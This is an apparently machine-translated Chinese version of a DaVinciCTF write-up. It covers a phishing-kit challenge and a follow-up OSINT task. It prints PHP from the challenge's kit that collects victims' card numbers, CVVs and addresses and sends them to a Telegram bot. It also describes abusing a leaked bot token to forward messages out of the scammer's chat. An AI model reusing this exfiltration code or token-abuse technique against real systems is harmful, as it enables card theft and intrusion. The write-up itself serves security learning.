<html>
<head>
<title>Post Office — DaVinciCTF — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">邮局—达文西特—报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/post-office-davincictf-writeup-ab1324a65377?source=collection_archive---------3-----------------------#2021-03-14">https://infosecwriteups.com/post-office-davincictf-writeup-ab1324a65377?source=collection_archive---------3-----------------------#2021-03-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="4c74" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">与海盗的对话</h2></div><p id="d603" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这个周末，我有幸扮演达芬奇CTF和我的团队浮士德获得第一名。这是一场非常有趣和高质量的CTF，有一些很好的和创造性的挑战。</p><p id="3aba" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">其中一个挑战是外国邮局，还有一个后续的全船挑战。在下文中，我将解释我们应对这一挑战的方法以及我们最终是如何解决这一问题的。</p><h1 id="fa13" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">邮局</h1><blockquote class="lt lu lv"><p id="f849" class="kf kg lw kh b ki kj jr kk kl km ju kn lx kp kq kr ly kt ku kv lz kx ky kz la ij bi translated">我今天收到一个包裹。几分钟后，我收到了以下短信，要求我支付运费:</p><p id="0695" class="kf kg lw kh b ki kj jr kk kl km ju kn lx kp kq kr ly kt ku kv lz kx ky kz la ij bi translated"><code class="fe ma mb mc md b">Chronopost: Veuillez confirmer le reglement des frais (2,99 EUR) et votre adresse de livraison du colis en cliquant sur le lien suivant: <a class="ae me" href="https://bit.ly/2Vw1THR" rel="noopener ugc nofollow" target="_blank">https://bit.ly/2Vw1THR</a></code></p><p id="b2f4" class="kf kg lw kh b ki kj jr kk kl km ju kn lx kp kq kr ly kt ku kv lz kx ky kz la ij bi translated">我发现了一个奇怪的PHP后门，而该网站仍然活跃，可以访问源代码。你能想办法看看谁被骗了吗？</p></blockquote><p id="8541" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">除了这个介绍，我们还收到了一个backup.zip文件，其中包含两个服务器日志文件和服务器的public_html目录。查看它，我们看到59个文件，并决定从日志文件开始，一个有2509行，另一个有14147行。</p><figure class="mg mh mi mj gt mk gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/e52b95827754127559791fcd3f546c3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:766/format:webp/1*FndmQUfDmyAICMo3hV6MdQ.png"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">backup.zip包含两个服务器日志文件和服务器的public_html目录</figcaption></figure><p id="8f59" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通过滚动抛出文件和搜索一些提示，我们的第一个猜测是，我们会在vuln.php找到更多的信息，一个文件被多次请求，显然听起来可疑。不幸的是，它没有包含在备份文件中。</p><figure class="mg mh mi mj gt mk gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mr"><img src="../Images/ce96dda82e8e154a081112bc9a6bc2ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KZxt09M0fi9h8l3y3I1hJA.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">日志文件包含大量可疑的呼叫，例如vuln.php</figcaption></figure><p id="884c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">不知何故——遗憾的是我不能告诉你具体是怎么回事——一位同事发现了文件<em class="lw"> public_html\知名\ pdf \ data \ chrono post 4 \ ngx \ wait . PHP .</em>由于文件与Telegram API一起工作，并且日志在某处提到Telegram，他可能只是搜索关键字Telegram。</p><p id="1907" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该文件包含向服务器发送消息的PHP代码，以及电报机器人令牌、聊天id和电报API命令sendMessage。此外，该消息包含发出请求的受害者的私人信息。</p><pre class="mg mh mi mj gt mw md mx my aw mz bi"><span id="e3c6" class="na lc iq md b gy nb nc l nd ne">[...]<br/>$message="";<br/>$message.=$ip."\n";<br/>$message.=$Nomcomplet."\n";<br/>$message.=$Adresse."\n";<br/>$message.=$ZIP."\n";<br/>$message.=$Number."\n";<br/>$message.=$MM."/".$AA."\n";<br/>$message.=$CVV."\n";</span><span id="d961" class="na lc iq md b gy nf nc l nd ne">// send message using Telegram API<br/>$website="http://challs.dvc.tf:1101/bot1337991337:AESCKk9bSy2kdtu-Ig7wYkzWkjltctu-UkN";<br/>//Receiver Chat Id<br/>$params=[<br/>    'chat_id'=&gt;'-1001324431100',<br/>    'text'=&gt;$message,<br/>];<br/>$ch = curl_init($website . '/sendMessage');<br/>[...]</span></pre><p id="3534" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，我们使用相同的命令尝试我们在官方<a class="ae me" href="https://core.telegram.org/bots/api" rel="noopener ugc nofollow" target="_blank"> Telegram API文档</a>中找到的其他Telegram API方法。例如，getMe调用告诉我们这个bot被称为sc4mm3r_bot。</p><p id="58cf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我立即用我的私人账户给机器人发消息，却看到我的消息出现在<em class="lw"> getUpdate </em>调用中。结果是:其他人现在都可以看到我的电报处理… s**t。幸运的是，你可以用最新的update_id调用<em class="lw"> getUpdate </em>，你的消息将不会再被列出。然而，在写这篇文章时，我检查了这个方法，发现出现了许多其他用户的名字。如果你在读这篇文章，我现在有你的把柄了:)</p><p id="bb4f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">无论如何，机器人没有回应，所以我们很快尝试了每一种可能的方法自动呼叫。不幸的是，只有少数方法被服务器支持，所有其他命令都被拒绝。我们能够使用<em class="lw"> forwardMessage </em>、<em class="lw"> copyMessage </em>、<em class="lw"> getUserProfilePhotos </em>、<em class="lw"> getFile </em>、<em class="lw"> getChat </em>、<em class="lw">getchatmanagements</em>、<em class="lw"> getChatMemberCount </em>和<em class="lw"> getChatMember </em>。</p><p id="aadf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正如挑战描述告诉我们的那样，目标是找到谁爱上了骗子，并得到他们的名字。PHP代码表明受害者的私人信息包含在群聊中。但是群聊只有两个成员，sc4mm3r_bot和一个叫黑胡子海盗的用户，很可能就是骗子本身。我们看不到将自己加入聊天或从群聊中轻松请求旧消息的可能性。</p><p id="b5ee" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">经过一番头脑风暴后，我们有了将聊天中的消息转发到我们在<em class="lw"> getUpdate </em>中看到的私人聊天id的想法。我们不知道message_id可能是什么，但只有一种方法可以知道。</p><p id="76fd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我发送了转发命令，当我的手机震动时，我很惊讶——我收到了一条新消息。转发message_id 3成功！快速for循环后，我的手机并没有停止振动，我收到了一个标志:<strong class="kh ir"> dvCTF{C0nt4ct_tH3_p0L1ce！！！} </strong></p><p id="2f25" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">下面你可以看到我解决挑战的python历史摘录和电报聊天的截图。</p><figure class="mg mh mi mj gt mk"><div class="bz fp l di"><div class="ng nh l"/></div></figure><figure class="mg mh mi mj gt mk gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ni"><img src="../Images/224ad18769c751369af47d36de6ef95a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VpDPU_HwgNv6YUJzTgmh5Q.jpeg"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">机器人转发包括该标志的群聊消息</figcaption></figure><h1 id="68e1" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">请上船</h1><blockquote class="lt lu lv"><p id="00da" class="kf kg lw kh b ki kj jr kk kl km ju kn lx kp kq kr ly kt ku kv lz kx ky kz la ij bi translated">查找邮局骗局背后的骗子的信息</p></blockquote><p id="0cc4" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我们成功提交了邮局挑战的旗帜后，一个新的挑战出现了。这项挑战被称为全船行动，属于奥辛特类。</p><p id="898b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我的第一个尝试是给骗子发信息，看看我是否能找到更多关于他的信息。也许一些社会工程会有所帮助。</p><p id="59f7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当海盗立即回应时，我感到很惊讶，因为他还没有准备好任何借口。然后我想到了一个伟大的问题:他最喜欢的旗帜是什么？遗憾的是，他不想让我说出来。</p><figure class="mg mh mi mj gt mk gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nj"><img src="../Images/cb1e6c7da8aa56443877b768337719e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cMa5nJZnpqq8n0xwQJ2Y7A.jpeg"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">与海盗的对话</figcaption></figure><p id="565f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然而，在GitHub上搜索他的用户名jsbdihwirbjebsjh(参见上面的python历史)会找到一个有三个资源库的GitHub用户:<a class="ae me" href="https://github.com/jsbdihwirbjebsjh" rel="noopener ugc nofollow" target="_blank">https://github.com/jsbdihwirbjebsjh</a></p><p id="2a42" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">资源库<em class="lw"> utils </em>包含一个名为<em class="lw"> locker.py </em>的文件，资源库<em class="lw"> treasure </em>包含两个加密文件，密钥可以在<em class="lw"> config/中找到。viminfo </em>。有了这些信息，很容易解密文件并接收标志:<strong class="kh ir"> dvCTF{4a4r_u_g0t_m3} </strong></p><figure class="mg mh mi mj gt mk"><div class="bz fp l di"><div class="ng nh l"/></div></figure><figure class="mg mh mi mj gt mk gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/ad52d08650dc3f05ba753ee7e40e2168.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*I86KNg_WLRzCm61Uv6Si_Q.jpeg"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">黑胡子海盗的自拍</figcaption></figure><h1 id="0565" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">摘要</h1><p id="e59b" class="pw-post-body-paragraph kf kg iq kh b ki nl jr kk kl nm ju kn ko nn kq kr ks no ku kv kw np ky kz la ij bi translated">正如你所看到的，这是一个伟大的和创造性的挑战，充满了现实主义。可悲的是，API密钥或凭证经常可以在GitHub库中找到，并导致灾难性的结果。事实上，几个月前a自己也试过:</p><div class="nq nr gp gr ns nt"><a rel="noopener  ugc nofollow" target="_blank" href="/how-i-got-access-to-other-peoples-medium-accounts-122d49b7f721"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">我是如何进入其他人的媒体账户的</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">GitHub搜索、API键和自动化的魔力</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">infosecwriteups.com</p></div></div><div class="oc l"><div class="od l oe of og oc oh ml nt"/></div></div></a></div><p id="d816" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">此外，我对所有网络挑战的评论可以在这里找到:</p><div class="nq nr gp gr ns nt"><a href="https://fh4ntke.medium.com/davincictf-web-challenges-writeup-517e77d6fa39" rel="noopener follow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">达芬奇密码—网络挑战—详细报道</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">这个周末，我有幸扮演达芬奇CTF和我的团队浮士德获得第一名。这很有趣，而且…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">fh4ntke.medium.com</p></div></div><div class="oc l"><div class="oi l oe of og oc oh ml nt"/></div></div></a></div><p id="94c2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，我只能说感谢达芬奇密码背后的团队，感谢我的团队同事，玩得很开心。</p></div></div>    
</body>
</html>